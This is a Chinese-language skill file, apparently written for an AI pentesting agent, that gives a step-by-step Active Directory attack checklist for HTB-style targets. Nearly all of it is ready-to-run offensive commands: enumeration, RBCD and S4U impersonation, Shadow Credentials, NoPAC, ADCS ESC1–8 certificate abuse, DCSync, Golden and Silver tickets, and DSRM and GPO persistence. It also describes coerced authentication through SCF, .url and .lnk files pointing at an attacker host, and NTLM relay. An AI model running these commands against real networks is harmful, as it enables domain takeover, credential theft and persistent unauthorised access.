---
name: 'ad-checklist'
description: 'Windows/AD 域渗透完整检查表：题型识别→枚举→攻击路径优先级→横向移动→持久化。含 dMSA/RBCD/Shadow Credentials 速查。'
whenToUse: '进入 AD 域需要完整渗透检查表时：题型识别→枚举→dMSA/Shadow Credentials/VMkatz→攻击路径优先级。'
metadata: { domain: ad-win, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Windows / AD 域渗透技能

> 🔴 **不自动加载。进 AD 域后调用 `加载技能 ad-checklist`。**

## 快速索引
| 场景 | 跳转 |
|------|------|
| 刚进域，不知道从哪开始 | §0 题型识别: OS版本→KDS→权限 |
| NTLM 全失败 / Kerberos 成功 | §7 Kerberos-Only 范式（⚠️ 最易踩坑） |
| 有 GenericWrite/WriteDacl | §3 RBCD/S4U / §5 Shadow Credentials / §2 BetterSuccessor |
| 需要枚举域内关系 | §1 枚举: BloodHound / ldapsearch / kerbrute |
| 有凭据需要横向移动 | 加载 `lateral-movement` |
| 有 ADCS / CA 但 certipy find 无漏洞 | §8 Certificate Theft |
| 有 ADCS 漏洞模板 | §16.1-16.10 ADCS ESC1-13（1-8 为主流） |
| 有可写 SMB 共享 | §9 强制认证 & NTLM Relay |
| 发现 RODC / krbtgt_XXXX | §10 RODC 攻击链 |
| 发现委派关系 | §11 委派攻击 (Unconstrained/Constrained) |
| 有 dMSA (Server 2025) | §2 dMSA + BetterSuccessor |
| 有 gMSA / 跨林 | §6 gMSA / §4 groupType |
| UAC=4128 机器 | §12 Pre2k 攻击 |
| 能创建机器账户 | §13 NoPAC / §14 Sam-the-Admin |
| 需要 Kerberoast/ASREP | §15 Kerberoasting (AES256 不可爆破) |
| 卡在工具报错 | 查 box-startup 的「工具局限表」和「粘滞点速查」 |

## 0. 题型识别（🔴 拿 shell 第一秒）

题型识别决策树见 ad-type-recognition 卡

## 1. 初始枚举（🔴 拿到域凭据第一步）

### 1.1 本地信息收集
```
[ ] whoami /all; whoami /priv; systeminfo; netstat -ano | findstr LISTEN
[ ] 🔴 env (凭据); 杀软/EDR 检测; .vmem/.vmdk 文件搜索
```

### 1.2 域枚举 — BloodHound（🔴 首选，最全面）
```
# 采集 — Windows
SharpHound.exe -c All --zipfilename loot.zip
# 或: SharpHound.exe -c All -d domain.htb --outputdirectory C:\temp

# 采集 — Linux (从攻击机)
bloodhound-python -u user -p pass -d domain.htb -dc dc.domain.htb -ns <DC_IP> -c All
# 🔴 -ns 是 DNS 解析必需，否则可能找不到 DC

# BloodHound CE 常用 Cypher 查询
MATCH (m:Computer) RETURN m
MATCH p=(u:User)-[r:MemberOf*1..]->(g:Group) WHERE g.name =~ "(?i)domain admins" RETURN p
MATCH p=(u)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(t) RETURN p
MATCH (u:User WHERE u.hasspn=true) RETURN u              # Kerberoastable
MATCH (u:User WHERE u.dontreqpreauth=true) RETURN u       # AS-REP Roastable
# 🔴 BloodHound CE 属性名可能不同: has_spn / dont_req_preauth

🔴 关键分析路径:
→ Shortest Path to Domain Admins
→ Find Principals with DCSync Rights
→ Shortest Path from Owned Principals
```

### 1.3 ldapsearch / ldapdomaindump（无 BloodHound 时）
```
ldapsearch -H ldap://<DC_IP> -D "user@domain.htb" -w pass -b "DC=domain,DC=htb" "(objectClass=*)" 2>/dev/null | head -500

ldapdomaindump -u domain\\user -p pass <DC>
→ 生成 domain_users.grep / domain_computers.grep / domain_groups.grep
```

### 1.4 无凭据枚举
```
# kerbrute 用户名枚举
kerbrute userenum -d domain.htb --dc <DC_IP> /path/to/usernames.txt

# rpcclient 空会话 (如果允许)
rpcclient -U '' -N <DC_IP>
> enumdomusers; querydispinfo; lsaenumsid

# enum4linux-ng 全量
enum4linux-ng <DC_IP> -A          # OS/共享/用户/组/RID/密码策略
```

### 1.5 域信任枚举
```
nltest /domain_trusts /all_trusts /v
🔴 多域 → SID-History Injection / 跨域横向
```

### 1.6 快速权限定位
```
[ ] 🔴 bloodyAD get writable → 找 CreateChild / GenericWrite / WriteDacl
```

## 2. dMSA / BetterSuccessor（Server 2025 专项）
```
前置: KDS Root Key + CreateChild on OU + GenericWrite on 目标
[ ] 🔴 ntpdate -b <DC_IP> — 时钟偏差致命

# SharpSuccessor 一键 (C# 编译或预编译)
SharpSuccessor.exe --target <target_DN> --ou <OU_DN>

# 或手动分步: bloodyAD 创建子计算机 + badS4U2self 模拟
# SharpSuccessor 一键命令见 quickref-cards
```

## 3. 🆕 RBCD + S4U2Self/Proxy（比凭据收集优先！）

> 🔴 **核心原则: 控制账户 ≠ 知道密码。能用委派模拟就不要花时间找密码！**

```
场景: 你对目标有 GenericWrite/WriteDacl，但无法改密码或 Shadow Credentials
→ 配置 RBCD，用你控制的另一个账户模拟目标

[1] 配置 RBCD:
    bloodyAD add rbcd <target_DN> <controlled_account>

[2] S4U2Self + S4U2Proxy:
    impacket-getST -k -no-pass -dc-ip <DC> \
      -spn '<target_SPN>' -impersonate '<victim>' \
      <domain>/<controlled_account>

[3] 合并 TGT+ST（S4U 票不含 TGT）:
    python3 -c "
    from impacket.krb5.ccache import CCache
    cc1 = CCache.loadFile('<tgt>')
    cc2 = CCache.loadFile('<st>')
    for c in cc2.credentials: cc1.credentials.append(c)
    cc1.saveFile('/tmp/combined.ccache')
    "

[4] 🔴 必须用 FQDN 不能用 IP:
    impacket-mssqlclient -k -no-pass '<domain>/<victim>@<FQDN>' -windows-auth
```
（SPN-less 见 rbcd-spnless 卡）

## 4. 🆕 groupType 跨林技巧

> 🔴 **不能 Global→Domain Local 直跳！必须 Global→Universal→Domain Local**

```
set object <DN> groupType -v="-2147483640"   # Universal (0x80000008)
set object <DN> groupType -v="-2147483644"   # Domain Local (0x80000004)
# 🔴 必须用 -v= 等号格式，否则负号被解析为命令行标志
```

## 5. Shadow Credentials（比 Kerberoast 优先）
```
[ ] bloodyAD add shadowCredentials <target>
[ ] certipy shadow auto -account <target> -u user -p pass -dc-ip <DC>
# 或 Rubeus asktgt /certificate
[ ] 🔴 限制: 目标域 KDC 必须有 CA，否则 KDC_ERR_PADATA_TYPE_NOSUPP
```

## 6. 🆕 gMSA 密码与 AES256 密钥
```
[ ] bloodyAD msldap gmsa → Password blob + NT hash
[ ] 🔴 AES256 必须用 RFC 3961 (不是简单 PBKDF2):
    aesKrbKeyGen.py -domain <FQDN> -user '<gMSA$>' -pass <hex_blob> -host
    → salt: DOMAINhostusername.domain
```

## 7. 🆕 Kerberos-Only / No-NTLM 范式（⚠️ 最易踩坑）

> 🔴 **NTLM 全失败 + Kerberos 成功 = Kerberos-Only 环境。所有工具参数完全不同。**

```
🔴 识别信号:
  → nxc smb DC -u user -p pass → STATUS_ACCOUNT_RESTRICTION
  → nxc smb DC -u user -H HASH  → 同样失败
  → impacket-GetNPUsers -k -no-pass domain/user → 成功!
  → 🔴 Protected Users 组 / NTML 全局禁用 → 只能 Kerberos

🔴 Kerberos-Only 命令范式 (全部加 -k -no-pass):
  # nxc:
  nxc smb DC -k -no-pass -u user
  nxc ldap DC -k -no-pass -u user --gmsa
  nxc winrm DC -k -no-pass -u user

  # impacket:
  impacket-GetNPUsers -k -no-pass domain/user -dc-ip DC
  impacket-GetUserSPNs -k -no-pass domain/user -dc-ip DC -request
  impacket-secretsdump -k -no-pass domain/user@DC
  impacket-psexec -k -no-pass domain/user@TARGET

  # certipy:
  certipy req -k -no-pass -target DC -ca CA -template T -upn admin@domain
  certipy find -k -no-pass -target DC -vulnerable

🔴 时钟偏差是 Kerberos-Only 的第一杀手:
  ntpdate -b <DC_IP>   # 每次操作前!

🔴 ccache 管理:
  export KRB5CCNAME=/tmp/user.ccache
  用 ccache 后不要再混用 -u/-p 参数 → 两者冲突
```
（详见 kerberos-only-ad 卡）

## 8. 🆕 Certificate Theft（certipy find 无漏洞 ≠ ADCS 不能打）

> 🔴 **机器账户已有证书时，不需要漏洞模板 — 直接导出利用。**

```
[1] 机器账户 cert 导出 (Windows):
    certutil -store My           # 列出个人证书
    certutil -exportPFX My <thumbprint> C:\temp\machine.pfx

[2] 如果是 SYSTEM:
    # 从 DPAPI 解密 :
    # 或直接 certipy 但不需要 find vulnerable:
    certipy cert -pfx machine.pfx -export

[3] PKINIT 工具链 (当 certipy auth 失败时):
    # certipy auth 支持 Kerberos 和 Schannel
    certipy auth -pfx cert.pfx -dc-ip DC
    # 备选: PKINITtools 
    gettgtpkinit.py domain/user -cert-pfx cert.pfx -pfx-pass '' user.ccache
    getnthash.py domain/user -key <AS_REP_key>

🔴 关键: THEFT1—机器证书本身就可用于认证，不需要漏洞模板
         THEFT4—CA 证书可伪造任意证书
```

## 9. 🆕 强制认证 & NTLM Relay 触发链

```
🔴 你有可写共享 / 消息队列注入点 → 强制目标回连 → 窃 NTLM

触发方法 (按成功率):
  [1] SCF 文件投放 — 最简单，可写 SMB 共享:
      [Shell]
      Command=2
      IconFile=\\KALI\share\icon.ico
      → 存为 something.scf → 目标打开文件夹 → Responder 抓 hash

  [2] PetitPotam — 强制 DC 回连:
      python3 PetitPotam.py -u user -p pass -d domain KALI_IP TARGET_IP

  [3] PrinterBug (MS-RPRN):
      python3 printerbug.py domain/user:pass@TARGET_IP KALI_IP

  [4] Coercer 全自动:
      coercer coerce -u user -p pass -d domain -t target -l KALI_IP

  [5] WebDAV / .url / .lnk 文件 (替代 SCF):
      .url: URL=file://KALI_IP/share
      .lnk: 指向 \\KALI_IP\share\evil.exe

🔴 Responder 准备:
   responder -I tun0 -v
   → 抓到 hash → hashcat -m 5600 hash rockyou.txt
   → 或 relay: ntlmrelayx -t ldap://DC --delegate-access
```
（完整链见 ntlm-relay-chain 卡）

## 10. 🆕 RODC 攻击链 (krbtgt_XXXX)

> 🔴 **RODC 不能做 DCSync！RODC 的 krbtgt 账户有特殊编号。**

```
识别:
  → BloodHound: 计算机的 PrimaryGroupID=521 (RODC)
  → krbtgt_XXXX 账户存在 (XXXX=RODC的msDS-SecondaryKrbTgtNumber)
  → 或 nxc 输出有 "RODC"

攻击路径:
  [1] RODC Golden Ticket (不是普通 Golden!):
      Rubeus.exe golden /domain:DOMAIN /sid:DOMAIN_SID 
        /user:Administrator /id:500 
        /rodcNumber:XXXX /aes256:krbtgt_XXXX_AES
        /flags:forwardable,renewable,enc_pa_rep
      
      🔴 /rodcNumber 是关键! 不加 → KDC_ERR_TGT_REVOKED

  [2] 或 se 从 RODC dump 的 NTDS.dit:
      secretsdump.py -sam SAM -system SYSTEM LOCAL
      → Administrator hash 可能不同

🔴 血的教训: RODC ≠ 普通 DC → 常规 DCSync 直接失败
```
（完整链见 rodc-privesc-chain 卡）

## 11. 🆕 委派攻击

```
🔴 快速识别 (BloodHound):
  → Unconstrained Delegation → 目标机器可捕获任何连接者的 TGT
  → Constrained Delegation → 目标可模拟任何用户访问特定服务
  → RBCD (Resource-Based) → §3 已覆盖

Unconstrained:
  [ ] 找到 UnconstrainedDelegation=true 的机器
  [ ] 拿到该机器的 SYSTEM 权限
  [ ] coins/mimikatz: sekurlsa::tickets → 导出所有缓存的 TGT
  [ ] 🔴 打印服务器、Web 服务器常用此配置

Constrained (S4U2Proxy):
  [ ] 有 Constrained Delegation + 知道目标 SPN
  [ ] impacket-getST -spn 'target_SPN' -impersonate 'administrator' domain/controlled
  [ ] 模拟管理员访问目标服务

🔴 委派优先级: RBCD > Constrained > Unconstrained
```

## 12. Pre2k Computer 攻击

```
🔴 UAC=4128 的机器账户 → 密码=小写主机名

识别:
  nxc smb DC -u '' -p '' -M pre2k

利用:
  # 主机名 TEST-SRV → 密码 = test-srv
  impacket-GetNPUsers domain/'TEST-SRV$' -dc-ip DC -no-pass
  
  # 或直接登录:
  nxc smb DC -u 'TEST-SRV$' -p 'test-srv'
```
（详见 pre2k-attack 卡）

## 13. NoPAC (CVE-2021-42278/42287)

```
🔴 Easy/Medium 仍然高频出现

条件: 能创建机器账户 + 能改 sAMAccountName

利用:
  [1] impacket-addcomputer domain/user:pass -dc-ip DC -computer-name FAKE$ -computer-pass Pass123!
  [2] bloodyAD set object "CN=FAKE,CN=Computers,DC=domain,DC=htb" sAMAccountName "DC"
  [3] impacket-getTGT domain/'DC' -dc-ip DC  → 拿 DC 的 TGT
  [4] 🔴 立即改回 sAMAccountName 否则 DC 会崩
  [5] impacket-secretsdump -k -no-pass domain/'DC$'@DC
```

## 14. NoPAC 替代: Sam-the-Admin

```
# 更简单的 NoPAC 变体:
  addcomputer.py → rename to 'DC' → get TGT → secretsdump
  # 工具: noPac.py (自动化)
```

## 15. Kerberoast / ASREP（🟡 最后一招）

Kerberoast/ASREP 完整流程见 password-attacks 卡

## 16. ADCS 攻击（🔴 现代 AD 题最大攻击面）

### 16.1 枚举
```
[ ] certipy find -vulnerable -dc-ip <DC_IP> -u user -p pass
[ ] certipy find -vulnerable -dc-ip <DC_IP> -k -no-pass -target <DC>
[ ] 🔴 certipy template 不支持 ccache → bloodyAD set object 直改 LDAP
```

### 16.2 ESC1 — 模板允许请求者指定 SAN
```
条件: ENROLLEE_SUPPLIES_SUBJECT + 允许客户端认证 + 未经理审批
利用:
certipy req -u user -p pass -dc-ip <DC> -ca <CA_NAME> \
  -template <Template> -upn administrator@domain.htb
certipy auth -pfx administrator.pfx -dc-ip <DC>
→ 直接拿 Administrator TGT/HT
```

### 16.3 ESC2 — Any Purpose / SubCA 模板
```
条件: 模板 EKU 为 "Any Purpose" (OID 2.5.29.37.0) 或完全无 EKU → 可用于客户端认证
利用: certipy req -ca <CA> -template <Template> -upn admin@domain.htb
→ 无 EKU 限制 = 证书可用于任何目的（含认证/签名/加密）
```

### 16.4 ESC3 — 注册代理（Enrollment Agent）
```
条件: 有 Enrollment Agent 模板的注册权 + 目标模板允许授权签名
利用:
certipy req -ca <CA> -template <AgentTemplate> ...   # 先拿代理证书
certipy req -ca <CA> -template <TargetTemplate> -on-behalf-of user \
  -pfx agent.pfx ...                                   # 用代理签目标证书
```

### 16.5 ESC4 — 模板 ACL 可写（最灵活）
```
条件: GenericWrite/WriteDacl on 模板对象
利用:
certipy template -u user -p pass -dc-ip <DC> -template <T> \
  -save-old -enable -add "ENROLLEE_SUPPLIES_SUBJECT" \
  -add-eac "Client Authentication"
→ 把安全模板改成漏洞模板 → 再用 ESC1
# 🔴 certipy template 不支持 ccache → bloodyAD set object 直改
```

### 16.6 ESC5 — CA 对象 ACL 可写
```
条件: WriteDacl/GenericAll on CA 对象（非模板）
利用: certipy ca -u user -p pass -ca <CA> -enable-template <Template>
→ 启用禁用模板 → 用其他 ESC 路径
```

### 16.7 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 标志
```
条件: CA 的 FLAG 有 EDITF_ATTRIBUTESUBJECTALTNAME2（旧补丁前默认）
利用: 同 ESC1，但任意模板只要允许客户端认证，用户可在 CSR 中指定 SAN
certipy req -ca <CA> -template <AnyAuthTemplate> -upn admin@domain.htb
```

### 16.8 ESC7 — ManageCA / ManageCertificates 权限
```
条件: ManageCA → 可修改 CA 设置 → 启用 EDITF_ATTRIBUTE...
条件: ManageCertificates → 可代发已批准的证书

ManageCA:
certipy ca -ca <CA> -enable-template <SubCA>  # 启用 SubCA 模板
# 或: certipy ca -ca <CA> -edit-flag EDITF_ATTRIBUTESUBJECTALTNAME2

ManageCertificates:
certipy ca -ca <CA> -issue-request <request_id>  # 签发待批准请求
```

### 16.9 ESC8 — NTLM Relay → ADCS Web Enrollment
```
前置: CA 有 HTTP Web Enrollment 端点 (http://<CA>/certsrv/)
利用链:
[1] 强制认证 → 中继到 ADCS Web Enrollment → 拿证书
    ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp \
      -smb2support --adcs --template <Template>
[2] 触发强制认证:
    PetitPotam.py -u '' -p '' -d domain relay_host target_host
    coercer coerce -u user -p pass -d domain -t target_host -l relay_host

🔴 key: 目标机器的 machine account 有 Template 注册权
```

### 16.10 黄金证书（Golden Certificate）
```
条件: CA 私钥泄露 → 直接签发自己的 CA 证书
利用: certipy ca -ca <CA> -backup → 导出 CA cert+key
→ 伪造任意证书 → 模拟任何用户
```

### 16.11 certipy req → auth 完整链路
```
# Step 1: 请求证书
certipy req -u user -p pass -dc-ip <DC> -ca <CA> \
  -template <Template> -upn admin@domain.htb -debug

# Step 2: 证书认证 → 拿 TGT + NT hash
certipy auth -pfx admin.pfx -dc-ip <DC>
→ KRB5CCNAME=admin.ccache; NT hash 存于 .txt

# Step 3 (可选): export KRB5CCNAME=admin.ccache → 横向
impacket-psexec -k -no-pass domain/admin@<TARGET>
```
（完整链见 adcs-attack-chain 卡）

## 17. DCSync
```
# 条件: Replicating Directory Changes / All 权限 (DA 或有 DCSync right)
impacket-secretsdump domain/user:pass@<DC>
impacket-secretsdump -k -no-pass domain/user@<DC>       # Kerberos

# 拿到 NTDS.dit → 所有域用户的 NT hash → Golden Ticket / PtH
```

## 18. 横向 / 持久化
```
# 持久化 — 至少建 2 条独立路径

# Golden Ticket (krbtgt hash → 无限期 TGT)
impacket-ticketer -domain-sid <SID> -domain <domain> -nthash <krbtgt_NT> administrator
export KRB5CCNAME=administrator.ccache

# Silver Ticket (服务 hash → 伪造特定服务 TGS)
impacket-ticketer -domain-sid <SID> -domain <domain> -spn cifs/<host> -nthash <machine_NT> user

# Shadow Credentials 持久化 (即使密码被改也能恢复)
bloodyAD add shadowCredentials <target_DN>          # 给目标加 key
certipy shadow auto -account <target>                # 随时用证书拿 TGT

# DSRM 持久化 (DC 恢复模式 DA)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
impacket-secretsdump -just-dc-user administrator <DC>
```

（详见 dsrm-credentials 卡）

深卡入口：
- SCCM →（详见 sccm-attacks 卡）
- DCShadow →（详见 dcshadow 卡）
- DNSAdmins →（详见 dnsadmins-privesc 卡）
- AdminSDHolder →（详见 adminsdholder-abuse 卡）
- Exchange/OWA →（详见 exchange-owa-attacks 卡）
- 用户名枚举 →（详见 username-generation 卡）
- PrintNightmare →（详见 printnightmare-printer-leaks 卡）
- SID History →（详见 sid-history-injection 卡）
- SCF 文件投放 →（详见 scf-ntlm-theft 卡）

## 19. 🆕 GPO / LAPS / DACL 链式利用

### 19.1 GPO Abuse
```
# 条件: GenericWrite / WriteDacl on GPO 对象
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" \
  --Arguments "/c powershell -enc <B64>" --GPOName "<GPO_NAME>"
gpupdate /force
```

### 19.2 LAPS 读取
```
# ReadLAPSPassword 权限 → 读本地 Admin 密码
Get-ADComputer -Identity <COMPUTER> -Properties ms-Mcs-AdmPwd
netexec ldap <DC_IP> -u user -p pass -M laps
```
（详见 laps-password-extraction 卡）

### 19.3 DACL 链式利用
```
# WriteDacl → GenericAll → Shadow Credentials → DCSync
bloodyAD set dacledit <target_DN> -s '<my_SID>' --full
bloodyAD add shadowCredentials <target_DN>
certipy shadow auto -account <target>

# WriteOwner → GenericAll → 重置密码
bloodyAD set owner <target_DN> <my_SID>
bloodyAD set password <target_DN> 'NewPass123!'
```

## 🆕 工具局限速查表

| 工具 | 不支持 | 替代方案 |
|------|--------|---------|
| `certipy template` | Kerberos ccache | `bloodyAD set object` 直改 LDAP |
| `bloodyAD msldap modify` | 整数属性 | `set object` 的 `-v=` 格式 |
| `impacket-mssqlclient` | 用 IP (SPN 不匹配) | **必须用 FQDN** |
| `certipy shadow` | 无 CA 的 KDC | 换 RBCD 路径 |

## 🆕 时钟同步铁律
```
🔴 任何 Kerberos 操作前: ntpdate -b <DC_IP>
```

## 快速优先级

| 优先级 | 路径 | 条件 |
|--------|------|------|
| 🔴 0 | 题型识别 | OS + KDS + 权限 + Protected Users? |
| 🔴 1 | BetterSuccessor | KDS + CreateChild + GenericWrite |
| 🔴 2 | **RBCD + S4U** | GenericWrite/WriteDacl + 可控账户 |
| 🔴 3 | ADCS ESC1-13（1-8 为主流） | certipy find → 模板漏洞 → req+auth |
| 🔴 4 | Shadow Credentials | GenericWrite + KDC 有 CA |
| 🔴 5 | **Certificate Theft** | 机器账户有证书 → 直接导出 |
| 🔴 6 | **Kerberos-Only 范式** | NTLM 全失败 → -k -no-pass |
| 🔴 7 | 强制认证 + Relay | 可写共享 → SCF/PetitPotam → relay |
| 🟠 8 | 委派攻击 | Unconstrained/Constrained 发现 |
| 🟠 9 | RODC Golden Ticket | krbtgt_XXXX + AES key |
| 🟠 10 | NoPAC / Sam-the-Admin | 能创建机器账户 + 可改名 |
| 🟠 11 | Pre2k | UAC=4128 → 密码=主机名 |
| 🟡 12 | Kerberoast/ASREP | 仅上策都不通 |
| 🟡 13 | 凭据搜索 | 最后手段 |

## 常见陷阱
1. **时钟偏差** — `ntpdate` 必须做
2. 🆕 **AES256 不可爆破** — 别花时间，走委派路径
3. 🆕 **控制≠知道密码** — 优先 RBCD 模拟，而非到处找密码
4. 🆕 **工具第一次认证失败 → 先验证工具是否支持这种认证方式**
5. **Rubeus dMSA NullReference** — 编最新版或修一行代码
